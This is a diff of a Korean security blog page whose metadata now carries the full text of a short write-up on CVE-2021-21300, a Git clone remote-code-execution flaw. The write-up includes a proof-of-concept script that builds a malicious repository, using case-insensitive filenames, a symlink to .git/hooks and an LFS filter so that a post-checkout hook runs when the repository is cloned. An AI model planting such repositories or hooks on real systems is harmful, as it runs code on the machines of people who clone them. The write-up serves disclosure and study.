@@ -13,15 +13,103 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.openwall.com/lists/oss-security/2021/03/09/3&#34;&gt;git: malicious repositories can execute remote code while cloning&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Git(2.14.2.windows.1&amp;#xC5D0;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB428;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xC624;&amp;#xD508;&amp;#xC18C;&amp;#xC2A4; &amp;#xBC84;&amp;#xC804; &amp;#xAD00;&amp;#xB9AC; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC778; Git&amp;#xC5D0;&amp;#xC11C; &amp;#xC6D0;&amp;#xACA9; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xB97C; clone &amp;#xD558;&amp;#xB294; &amp;#xB3C4;&amp;#xC911; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5B4; &amp;#xAD00;&amp;#xB828; &amp;#xC138;&amp;#xBD80; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xC870;&amp;#xAC74;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xD0C0;&amp;#xAE43; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC774; NTFS&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB300;&amp;#xC18C;&amp;#xBB38;&amp;#xC790;&amp;#xB97C; &amp;#xAD6C;&amp;#xBD84;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0;, &amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.(Windows &amp;#xBC0F; macOS&amp;#xC758; &amp;#xAE30;&amp;#xBCF8; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Git LFS&amp;#xC640; &amp;#xAC19;&amp;#xC774; clean &amp;#xD639;&amp;#xC740; smudge &amp;#xD544;&amp;#xD130;&amp;#xAC00; &amp;#xC804;&amp;#xC5ED;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC5B4;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;#xC545;&amp;#xC131; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB294; PoC&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/sh&lt;/span&gt;
+
+  git init delayed-checkout &amp;amp;&amp;amp;
+  (
+  	&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; delayed-checkout &amp;amp;&amp;amp;
+  	&lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;A/post-checkout filter=lfs diff=lfs merge=lfs&amp;quot;&lt;/span&gt; \\
+  		&amp;gt;.gitattributes &amp;amp;&amp;amp;
+  	mkdir A &amp;amp;&amp;amp;
+  	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;#!/bin/sh\\n\\necho PWNED &amp;gt;&amp;amp;2\\n&amp;apos;&lt;/span&gt; &amp;gt;A/post-checkout &amp;amp;&amp;amp;
+  	chmod +x A/post-checkout &amp;amp;&amp;amp;
+  	&amp;gt;A/a &amp;amp;&amp;amp;
+  	&amp;gt;A/b &amp;amp;&amp;amp;
+  	git add -A &amp;amp;&amp;amp;
+  	rm -rf A &amp;amp;&amp;amp;
+  	ln -s .git/hooks a &amp;amp;&amp;amp;
+  	git add a &amp;amp;&amp;amp;
+  	git commit -m initial
+  )&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xC784;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xC545;&amp;#xC131; &amp;#xD30C;&amp;#xC77C;&amp;#xC778; &lt;code&gt;A/post-checkout&lt;/code&gt;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xD6C4; &amp;#xC81C;&amp;#xAC70;&amp;#xB418;&amp;#xBA74; Git &amp;#xCE90;&amp;#xC2DC;&amp;#xC5D0; &amp;#xB0A8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;./git/hooks&lt;/code&gt;&amp;#xC758; &amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C; &lt;code&gt;a&lt;/code&gt;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;git hooks - &amp;#xD2B9;&amp;#xC815; &amp;#xC774;&amp;#xBCA4;&amp;#xD2B8;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xD0C0;&amp;#xAE43;&amp;#xC774; &amp;#xB300;&amp;#xC18C;&amp;#xBB38;&amp;#xC790;&amp;#xB97C; &amp;#xAD6C;&amp;#xBD84;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC774;&amp;#xB77C;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xB97C; clone &amp;#xD560; &amp;#xB54C; &lt;code&gt;a&lt;/code&gt;&amp;#xC640; &lt;code&gt;A&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xBD84;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD574; &lt;code&gt;./git/hooks/post-checkout&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; Git &amp;#xCE90;&amp;#xC2DC;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC545;&amp;#xC131;&amp;#xD30C;&amp;#xC77C;&amp;#xC778; &lt;code&gt;A/post-checkout&lt;/code&gt;&amp;#xB85C; &amp;#xB300;&amp;#xCCB4;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;git hooks&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &lt;code&gt;post-checkout&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xACE0; &lt;code&gt;post-checkout&lt;/code&gt;&amp;#xC5D0; &amp;#xC791;&amp;#xC131;&amp;#xB41C; &amp;#xC784;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/03/23/l0ch/2021-03-23/image.png&#34; alt&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;POC - &lt;a href=&#34;https://github.com/Maskhe/CVE-2021-21300&#34;&gt;https://github.com/Maskhe/CVE-2021-21300&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] CVE-2021-21300: Git의 저장소 clone 원격 코드 실행 취약점 - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.openwall.com/lists/oss-security/2021/03/09/3&#34;&gt;git: malicious repositories can execute remote code while cloning&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;Git(2.14.2.windows.1&amp;#xC5D0;&amp;#xC11C; &amp;#xD14C;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB428;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xC624;&amp;#xD508;&amp;#xC18C;&amp;#xC2A4; &amp;#xBC84;&amp;#xC804; &amp;#xAD00;&amp;#xB9AC; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC778; Git&amp;#xC5D0;&amp;#xC11C; &amp;#xC6D0;&amp;#xACA9; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xB97C; clone &amp;#xD558;&amp;#xB294; &amp;#xB3C4;&amp;#xC911; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5B4; &amp;#xAD00;&amp;#xB828; &amp;#xC138;&amp;#xBD80; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70; &amp;#xC870;&amp;#xAC74;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xD0C0;&amp;#xAE43; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC774; NTFS&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB300;&amp;#xC18C;&amp;#xBB38;&amp;#xC790;&amp;#xB97C; &amp;#xAD6C;&amp;#xBD84;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0;, &amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C;&amp;#xB97C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD574;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.(Windows &amp;#xBC0F; macOS&amp;#xC758; &amp;#xAE30;&amp;#xBCF8; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Git LFS&amp;#xC640; &amp;#xAC19;&amp;#xC774; clean &amp;#xD639;&amp;#xC740; smudge &amp;#xD544;&amp;#xD130;&amp;#xAC00; &amp;#xC804;&amp;#xC5ED;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC5B4;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&amp;#xC545;&amp;#xC131; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB294; PoC&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#!/bin/sh&lt;/span&gt;
+
+  git init delayed-checkout &amp;amp;&amp;amp;
+  (
+  	&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; delayed-checkout &amp;amp;&amp;amp;
+  	&lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;A/post-checkout filter=lfs diff=lfs merge=lfs&amp;quot;&lt;/span&gt; \\
+  		&amp;gt;.gitattributes &amp;amp;&amp;amp;
+  	mkdir A &amp;amp;&amp;amp;
+  	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;#!/bin/sh\\n\\necho PWNED &amp;gt;&amp;amp;2\\n&amp;apos;&lt;/span&gt; &amp;gt;A/post-checkout &amp;amp;&amp;amp;
+  	chmod +x A/post-checkout &amp;amp;&amp;amp;
+  	&amp;gt;A/a &amp;amp;&amp;amp;
+  	&amp;gt;A/b &amp;amp;&amp;amp;
+  	git add -A &amp;amp;&amp;amp;
+  	rm -rf A &amp;amp;&amp;amp;
+  	ln -s .git/hooks a &amp;amp;&amp;amp;
+  	git add a &amp;amp;&amp;amp;
+  	git commit -m initial
+  )&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xC784;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xC545;&amp;#xC131; &amp;#xD30C;&amp;#xC77C;&amp;#xC778; &lt;code&gt;A/post-checkout&lt;/code&gt;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xD6C4; &amp;#xC81C;&amp;#xAC70;&amp;#xB418;&amp;#xBA74; Git &amp;#xCE90;&amp;#xC2DC;&amp;#xC5D0; &amp;#xB0A8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;./git/hooks&lt;/code&gt;&amp;#xC758; &amp;#xC2EC;&amp;#xBCFC;&amp;#xB9AD; &amp;#xB9C1;&amp;#xD06C; &lt;code&gt;a&lt;/code&gt;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;git hooks - &amp;#xD2B9;&amp;#xC815; &amp;#xC774;&amp;#xBCA4;&amp;#xD2B8;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; &amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xD0C0;&amp;#xAE43;&amp;#xC774; &amp;#xB300;&amp;#xC18C;&amp;#xBB38;&amp;#xC790;&amp;#xB97C; &amp;#xAD6C;&amp;#xBD84;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xD30C;&amp;#xC77C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C;&amp;#xC774;&amp;#xB77C;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xC800;&amp;#xC7A5;&amp;#xC18C;&amp;#xB97C; clone &amp;#xD560; &amp;#xB54C; &lt;code&gt;a&lt;/code&gt;&amp;#xC640; &lt;code&gt;A&lt;/code&gt;&amp;#xB97C; &amp;#xAD6C;&amp;#xBD84;&amp;#xD558;&amp;#xC9C0; &amp;#xBABB;&amp;#xD574; &lt;code&gt;./git/hooks/post-checkout&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; Git &amp;#xCE90;&amp;#xC2DC;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC545;&amp;#xC131;&amp;#xD30C;&amp;#xC77C;&amp;#xC778; &lt;code&gt;A/post-checkout&lt;/code&gt;&amp;#xB85C; &amp;#xB300;&amp;#xCCB4;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;git hooks&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &lt;code&gt;post-checkout&lt;/code&gt;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xACE0; &lt;code&gt;post-checkout&lt;/code&gt;&amp;#xC5D0; &amp;#xC791;&amp;#xC131;&amp;#xB41C; &amp;#xC784;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/03/23/l0ch/2021-03-23/image.png&#34; alt&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;POC - &lt;a href=&#34;https://github.com/Maskhe/CVE-2021-21300&#34;&gt;https://github.com/Maskhe/CVE-2021-21300&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/03/23/l0ch/2021-03-23/">
@@ -271,7 +359,6 @@
   	git add a &amp;&amp;
   	git commit -m initial
   )</code></pre>
-
 <ol>
 <li><p>&#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC778; <code>A/post-checkout</code>&#xC774; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xCD94;&#xAC00;&#xB41C; &#xD6C4; &#xC81C;&#xAC70;&#xB418;&#xBA74; Git &#xCE90;&#xC2DC;&#xC5D0; &#xB0A8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>./git/hooks</code>&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C; <code>a</code>&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <ul>
@@ -283,7 +370,7 @@
 <li><p>git hooks&#xC5D0; &#xC758;&#xD574; <code>post-checkout</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xACE0; <code>post-checkout</code>&#xC5D0; &#xC791;&#xC131;&#xB41C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p>
 </li>
 </ol>
-<p><img src="/2021/03/23/l0ch/2021-03-23/image.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/03/23/l0ch/2021-03-23/image.png" srcset="/img/loading.gif" alt></p>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/Maskhe/CVE-2021-21300">https://github.com/Maskhe/CVE-2021-21300</a></p>
 
             </div>
